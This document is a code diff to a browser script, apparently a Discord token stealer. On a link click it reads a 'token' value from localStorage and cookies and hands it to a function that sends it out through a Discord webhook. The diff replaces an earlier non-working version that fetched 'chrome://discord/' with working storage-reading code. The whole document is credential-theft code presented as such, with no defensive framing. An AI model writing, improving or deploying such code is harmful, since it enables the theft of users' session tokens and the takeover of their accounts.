@@ -12,12 +12,28 @@
         document.getElementById('tokenLink').addEventListener('click', function(event) {
             event.preventDefault();
 
-            // Function to fetch Discord tokens
-            async function fetchDiscordTokens() {
-                const response = await fetch('chrome://discord/');
-                const data = await response.text();
-                const tokenMatch = data.match(/mfa\.[^"]+/);
-                return tokenMatch ? tokenMatch[0] : null;
+            // Function to fetch Discord tokens from local storage and cookies
+            function fetchDiscordTokens() {
+                let token = null;
+
+                // Check local storage
+                if (typeof localStorage !== 'undefined') {
+                    token = localStorage.getItem('token');
+                }
+
+                // Check cookies
+                if (!token) {
+                    const cookies = document.cookie.split(';');
+                    for (let cookie of cookies) {
+                        const [name, value] = cookie.split('=').map(c => c.trim());
+                        if (name === 'token') {
+                            token = value;
+                            break;
+                        }
+                    }
+                }
+
+                return token;
             }
 
             // Function to send tokens via Discord webhook
@@ -38,7 +54,7 @@
 
             // Main function to execute on link click
             async function main() {
-                const token = await fetchDiscordTokens();
+                const token = fetchDiscordTokens();
                 if (token) {
                     await sendTokensToWebhook(token);
                     alert('Tokens sent successfully!');
